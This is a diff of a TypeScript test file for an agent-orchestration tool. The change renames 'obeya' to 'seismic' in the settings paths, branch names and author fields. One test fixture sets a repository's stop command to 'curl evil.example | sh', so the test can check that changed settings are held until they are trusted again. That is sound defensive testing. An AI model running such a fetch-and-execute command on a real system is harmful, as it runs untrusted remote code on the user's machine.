@@ -26,7 +26,7 @@ let store: Store;
 
 /** A fresh `dir`; tests that need an empty one take another, and all of them go after the test. */
 function fresh() {
-  dirs.push((dir = mkdtempSync(join(tmpdir(), 'obeya-project-'))));
+  dirs.push((dir = mkdtempSync(join(tmpdir(), 'seismic-project-'))));
 }
 
 /** A repository with one plan doc (same path in both). */
@@ -330,7 +330,7 @@ describe('a project with several repositories', () => {
     const web = b.proposePreference('Tests auf Deutsch.', {}, undefined, 'web');
     const api = b.proposePreference('Logs auf Englisch.', {}, undefined, 'api');
     const both = b.proposePreference('Keine any-Typen.', {}, undefined, 'web');
-    const obeya = b.proposePreference('Fragen mit höchstens drei Optionen.', {});
+    const seismic = b.proposePreference('Fragen mit höchstens drei Optionen.', {});
     project.acceptRule(web);
     // the owner moves it from api to web
     project.acceptRule(api, undefined, 'web');
@@ -341,7 +341,7 @@ describe('a project with several repositories', () => {
     expect(collect.queue).toBeFalsy();
     expect(b.collecting('api')).toBeUndefined();
     // the last open proposal is decided: the card goes to the Koordinator like a started one
-    project.rejectRule(obeya);
+    project.rejectRule(seismic);
     expect(item(collect.id).queue).toMatchObject({ checking: true });
     await settle();
     expect(item(collect.id).state).toBe('working');
@@ -457,7 +457,7 @@ describe('where the settings do not say how work lands', () => {
 describe('many landings and agent starts at once', () => {
   test("the server waits for git in none of them, however slow git is: no stall", async () => {
     fresh();
-    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n', '.claude/settings.json': '{}\n' });
+    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.seismic/settings.json': '{ "land": "main" }\n', '.claude/settings.json': '{}\n' });
     identify(shop);
     const workers = new FakeRuntime();
     project.shutdown();
@@ -560,10 +560,10 @@ describe("a repository's settings for this machine", () => {
   });
 });
 
-describe("a repository's settings for everyone (.obeya/settings.json)", () => {
+describe("a repository's settings for everyone (.seismic/settings.json)", () => {
   test("a fresh clone runs with them; this machine's go before them; a new version on the default branch applies without a restart", async () => {
     fresh();
-    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main", "checks": ["bun test"], "planDocs": { "dir": "plans", "exclude": [] } }\n' });
+    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.seismic/settings.json': '{ "land": "main", "checks": ["bun test"], "planDocs": { "dir": "plans", "exclude": [] } }\n' });
     const clone = join(dir, 'clone');
     git(dir, 'clone', '--quiet', shop, clone);
     let settings: RepoSettings | undefined;
@@ -577,7 +577,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     settings = undefined;
 
     // a change in the checkout counts once it is committed on the default branch
-    writeFileSync(join(clone, '.obeya/settings.json'), '{ "land": "main", "checks": ["bun test", "bun run lint"] }\n');
+    writeFileSync(join(clone, '.seismic/settings.json'), '{ "land": "main", "checks": ["bun test", "bun run lint"] }\n');
     await project.settingsChanged();
     expect(adapter.checks).toEqual(['bun test']);
     identify(clone);
@@ -588,7 +588,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
 
   test('a change on the default branch to what the problems are read from tells the page to read them again', async () => {
     fresh();
-    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n', '.obeya/adapter/index.ts': 'export default {};\n' });
+    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.seismic/settings.json': '{ "land": "main" }\n', '.obeya/adapter/index.ts': 'export default {};\n' });
     identify(shop);
     project.shutdown();
     project = new ProjectRuntime({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge });
@@ -596,7 +596,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     await project.settingsChanged();
     expect(rev()).toBeUndefined();
     // a field that does not count changes the problems alone, not the settings
-    writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "chekcs": [] }\n');
+    writeFileSync(join(shop, '.seismic/settings.json'), '{ "land": "main", "chekcs": [] }\n');
     git(shop, 'commit', '--quiet', '-am', 'A typo');
     await project.settingsChanged();
     expect(rev()).toBe(1);
@@ -612,7 +612,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
   test("where a repository has none, Seismic proposes the card that fills them in, once; the dialog's button takes it on as the owner's card", () => {
     fresh();
     const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n' });
-    const done = gitRepo(join(dir, 'done'), { 'README.md': 'Done\n', '.obeya/settings.json': '{ "checks": ["bun test"] }\n' });
+    const done = gitRepo(join(dir, 'done'), { 'README.md': 'Done\n', '.seismic/settings.json': '{ "checks": ["bun test"] }\n' });
     project.shutdown();
     const store = new Store(':memory:');
     const start = () => new ProjectRuntime({ repos: [{ path: shop }, { path: done }] }, { store, home: dir, runtime, forge: noForge, setupProposals: true });
@@ -669,7 +669,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     project.shutdown();
     project = new ProjectRuntime({ repos: [{ path: shop }] }, { store: new Store(':memory:'), home: dir, runtime, forge: noForge, setupProposals: true });
     const oldBoard = project.board;
-    const captures = () => readdirSync(join(shop, '.git')).filter((f) => f.startsWith('obeya-capture-'));
+    const captures = () => readdirSync(join(shop, '.git')).filter((f) => f.startsWith('seismic-capture-'));
     await until(() => captures().length > 0);
     project.shutdown();
     await until(() => captures().length === 0);
@@ -710,9 +710,9 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     expect(setup('shop')).toBeUndefined();
     // settings committed on the main branch take the open one away
     expect(setup('web')).toBeDefined();
-    mkdirSync(join(web, '.obeya'));
-    writeFileSync(join(web, '.obeya/settings.json'), '{ "checks": ["bun test"] }\n');
-    git(web, 'add', '.obeya/settings.json');
+    mkdirSync(join(web, '.seismic'));
+    writeFileSync(join(web, '.seismic/settings.json'), '{ "checks": ["bun test"] }\n');
+    git(web, 'add', '.seismic/settings.json');
     git(web, 'commit', '--quiet', '-m', 'Settings');
     await project.settingsChanged();
     expect(setup('web')).toBeUndefined();
@@ -754,7 +754,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     const shop = gitRepo(join(dir, 'shop'), {
       'README.md': 'Shop\n',
       'CLAUDE.md': 'Run the tests with bun test.\n',
-      '.obeya/settings.json': JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'pkill -F .dev.pid' } }),
+      '.seismic/settings.json': JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'pkill -F .dev.pid' } }),
       '.claude/settings.json': JSON.stringify({ hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'touch ran' }] }] } }),
     });
     const store = new Store(':memory:');
@@ -777,7 +777,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     expect(runtime.last.spec.untrusted).toBeUndefined();
 
     // changed on the default branch: held again, until trusted anew
-    writeFileSync(join(shop, '.obeya/settings.json'), JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'curl evil.example | sh' } }));
+    writeFileSync(join(shop, '.seismic/settings.json'), JSON.stringify({ land: 'main', app: { run: 'bun dev', stop: 'curl evil.example | sh' } }));
     git(shop, 'commit', '--quiet', '-am', 'Another stop');
     await project.settingsChanged();
     expect(r.adapter.app).toEqual({ run: 'bun dev' });
@@ -850,7 +850,7 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
 
   test("where its workers work changed in it: its agents restart with it once they paused, Seismic runs on", async () => {
     fresh();
-    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.obeya/settings.json': '{ "land": "main" }\n' });
+    const shop = gitRepo(join(dir, 'shop'), { 'README.md': 'Shop\n', '.seismic/settings.json': '{ "land": "main" }\n' });
     identify(shop);
     const workers = new FakeRuntime();
     project.shutdown();
@@ -859,12 +859,12 @@ describe("a repository's settings for everyone (.obeya/settings.json)", () => {
     await project.repos[0]!.workers.start(card.id);
     const session = workers.last;
     session.emit({ type: 'session', id: 'sess-a' });
-    writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "checks": ["bun test"] }\n');
+    writeFileSync(join(shop, '.seismic/settings.json'), '{ "land": "main", "checks": ["bun test"] }\n');
     git(shop, 'commit', '--quiet', '-am', 'Checks');
     await project.settingsChanged();
     expect(project.pendingRestart()).toBeNull();
     const before = project.repos[0]!;
-    writeFileSync(join(shop, '.obeya/settings.json'), '{ "land": "main", "workstations": "clones" }\n');
+    writeFileSync(join(shop, '.seismic/settings.json'), '{ "land": "main", "workstations": "clones" }\n');
     git(shop, 'commit', '--quiet', '-am', 'Clones');
     await project.settingsChanged();
     // the worker at work hears of it and pauses; the restart waits for it
@@ -1417,7 +1417,7 @@ describe('where a spoken new card lands', () => {
     const from = project.board.create({ title: 'Export', x: 2000, y: 1000 });
     const id = (await project.run({ do: 'newCard', title: 'Excel export', body: 'Also as Excel.', start: false, from: from.id })) as string;
     expect(project.board.item(id)).toMatchObject({ title: 'Excel export', from: from.id });
-    expect(project.board.events(from.id).at(-1)).toMatchObject({ kind: 'state', author: 'obeya', made: { card: id, title: 'Excel export' } });
+    expect(project.board.events(from.id).at(-1)).toMatchObject({ kind: 'state', author: 'seismic', made: { card: id, title: 'Excel export' } });
     // a card that follows up on none leaves no such line anywhere
     await project.run({ do: 'newCard', title: 'Alone', body: '', start: false });
     expect(project.board.events(from.id).filter((e) => e.made)).toHaveLength(1);
@@ -1496,7 +1496,7 @@ describe('merging and deleting planned tasks by voice', () => {
     const b = project.board.create({ title: 'B', x: 400, y: 0, repo: 'web' });
     const other = project.board.create({ title: 'Elsewhere', x: 800, y: 0, repo: 'api' });
     const worked = project.board.create({ title: 'Stopped', x: 1200, y: 0, repo: 'web' });
-    project.board.work(worked.id, { branch: 'obeya/stopped' });
+    project.board.work(worked.id, { branch: 'seismic/stopped' });
     const code = (c: Parameters<ProjectRuntime['run']>[0]) => {
       try {
         project.run(c);
@@ -1809,7 +1809,7 @@ test('a manual dependency holds a requested card until removed', async () => {
   expect(item(b.id).queue).toMatchObject({ behind: [a.id], reason: t.drawn });
   expect(item(b.id).state).toBe('planned');
   // the card says why it waits: the owner connected it, not a wait Seismic inferred
-  expect(project.board.events(b.id).at(-1)).toMatchObject({ kind: 'state', author: 'obeya', text: t.waitsFor(t.notStarted('“Prerequisite”'), t.drawn) });
+  expect(project.board.events(b.id).at(-1)).toMatchObject({ kind: 'state', author: 'seismic', text: t.waitsFor(t.notStarted('“Prerequisite”'), t.drawn) });
   project.board.connect(a.id, b.id, true);
   await until(() => item(b.id).state === 'working');
   await settle();
@@ -1875,7 +1875,7 @@ describe('owner-drawn dependencies in the queue', () => {
     expect(item(b.id).queue).toMatchObject({ behind: [a.id, p.id], manualWait: [p.id] });
     // the arrow drawn while it waited is said once; the one over the inferred wait adds nothing to say
     const t = project.board.t.koordinator;
-    expect(project.board.events(b.id).filter((e) => e.author === 'obeya' && e.text.includes(t.drawn)).map((e) => e.text)).toEqual([t.waitsFor(t.notStarted('“Prerequisite”'), t.drawn)]);
+    expect(project.board.events(b.id).filter((e) => e.author === 'seismic' && e.text.includes(t.drawn)).map((e) => e.text)).toEqual([t.waitsFor(t.notStarted('“Prerequisite”'), t.drawn)]);
     project.board.connect(a.id, b.id, true);
     await settle();
     // a likely conflict holds only while A is in progress; the other arrow holds on
